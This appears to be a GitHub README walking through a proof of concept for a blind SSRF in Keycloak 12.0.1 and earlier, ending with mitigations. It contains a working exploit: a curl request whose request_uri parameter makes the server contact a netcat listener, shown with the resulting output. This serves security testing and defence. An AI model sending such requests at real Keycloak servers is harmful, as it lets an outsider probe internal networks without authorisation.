# Keycloak Blind SSRF POC

This is a step by step walk-through about how to test the blind ssrf found by Lauritz Holtmann and documented in his [blog post](https://security.lauritz-holtmann.de/post/sso-security-ssrf/).  
He also [briefly explained how to test it](https://twitter.com/_lauritz_/status/1347246269631238145). This is just a more detailed explanation.

All credits go to [Lauritz](https://twitter.com/_lauritz_).

# Setup 

I use Docker on Mac OSX here.  
I needed three shells, one running the Keycloak instance, one for the listener and one for the curl request.

## Defender

You need a running Keycloak instance with a version <= 12.0.1.  
You can start a test instance with the following command. 
```
docker run -p 9990:9990 -p 8080:8080 -e KEYCLOAK_USER=admin -e KEYCLOAK_PASSWORD=admin jboss/keycloak:12.0.1
```

Visit http://localhost:8080/auth/admin/ in a browser and login with the username "admin" and the password "admin".

On the left side switch to the menu "Clients". This will bring you the the Clients overview.  
![Oauth2 client overview](https://github.com/ramshazar/keycloak-blind-ssrf-poc/blob/main/img/client_config.jpg?raw=true)

On the right side click on "Create" to create a new client. This will bring you to the client creation page.  
![Oauth2 client creation](https://github.com/ramshazar/keycloak-blind-ssrf-poc/blob/main/img/client_config_2.jpg?raw=true)

Choose a reasonable "Client ID" for your Oauth2 client. I go with "blueteamoauth2client" here (this is your <Keycloak_Client_ID>). If you use another Client ID, you have to change a query parameter in the attack http request. Click save to finalize the client setup.  
![Oauth2 client creation](https://github.com/ramshazar/keycloak-blind-ssrf-poc/blob/main/img/client_config_3.jpg?raw=true)

You will now see the settings of our new Oauth2 client.  
![Oauth2 client creation](https://github.com/ramshazar/keycloak-blind-ssrf-poc/blob/main/img/client_config_4.jpg?raw=true)

That is all for the defending part.

## Attacker

### Listener

You need a listener that is accepting the request that we want to trigger with our SSRF. So the ip and port must be reachable from the Keyclok server.  
You can not use localhost in that case, because from Keycloaks point of view localhost will be in the container itself.  
To retrieve the ip address in Mac OS you can use
```
for iface in $(ifconfig  | grep ^en | awk -F\: {'print $1'}); do ipconfig getifaddr $iface; done
```

I chose to start the listener on my host system on port 4444.
```
nc -v -l 4444
```

### Attack

In another shell you have to do one request with curl. You have to change that to your requirements.
```
curl "http://<Keycloak_host_or_ip>:<Keycloak_port>/auth/realms/<Keycloak_realm>/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=a&nonce=b&client_id=<Keycloak_Client_ID>&request_uri=http://<Netcat_listener_ip>:<Netcat_listener_port>/"
```

The important parts are:
* <Keycloak_host_or_ip> in my case "localhost".
* <Keycloak_port> in my case "8080".
* <Keycloak_realm> the realm used by Keycloak. The default is "master". That is what I use here.
* <Netcat_listener_ip> the ip address of the netcat listener.
* <Netcat_listener_port> the port of the netcat listener.

So the query in my case is
```
curl "http://localhost:8080/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=a&nonce=b&client_id=blueteamoauth2client&request_uri=http://192.168.178.222:4444/"
```

## Result

In the netcat listener you will see something like this.

```
bash-3.2$ nc -v -l 4444
GET / HTTP/1.1
Host: 192.168.178.222:4444
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.5.13 (Java/11.0.9.1)
Accept-Encoding: gzip,deflate

bash-3.2$
```

That means that the Keycloak instance did a http call to your listener.

There will also be entries about this in the Keycloak logs.
```
13:37:28,855 WARN  [org.keycloak.services] (default task-16) KC-SERVICES0097: Invalid request: java.net.SocketTimeoutException: Read timed out
	at java.base/java.net.SocketInputStream.socketRead0(Native Method)
	at java.base/java.net.SocketInputStream.socketRead(SocketInputStream.java:115)
(...)
13:37:28,877 WARN  [org.keycloak.events] (default task-16) type=LOGIN_ERROR, realmId=master, clientId=blueteamoauth2client, userId=null, ipAddress=172.17.0.1, error=invalid_request
```

# Mitigation

To mitigate that you could either. 
* Update Keycloak to version >= 12.0.2. 
* Make sure that a reverse proxy in front of Keycloak drops every request that includes the query parameter "request_uri".  

# Acknowledgements

Thanks to [Lauritz](https://twitter.com/_lauritz_) for finding and reporting the SSRF, for writing the blog post and also for the initial hint how to do this.  
Thanks to [Sebastian](https://groups.google.com/g/keycloak-dev/c/az-FYoI6WDg/m/emwMWfagAAAJ) for the idea to block requests with query parameter "request_uri" in the reverse proxy.
